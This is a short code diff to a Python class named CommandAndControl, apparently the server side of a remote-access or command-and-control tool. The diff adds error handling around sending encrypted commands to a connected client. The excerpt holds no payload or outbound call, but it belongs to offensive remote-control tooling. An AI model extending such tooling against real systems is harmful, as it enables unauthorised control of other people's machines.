@@ -25,9 +25,13 @@ class CommandAndControl:
         self.conn.close()
         
     def send_command_to_client(self, data: str):
-        data = data.encode(utils.ENCODING)
-        encrypted_data = utils.encrypt(data)
-        self.conn.sendall(encrypted_data)
+        try:
+            data = data.encode(utils.ENCODING)
+            encrypted_data = utils.encrypt(data)
+            self.conn.sendall(encrypted_data)
+        except socket.error as err:
+            logging.info(err)
+            exit(-1)
         
     def receive_from_client(self):
         try:
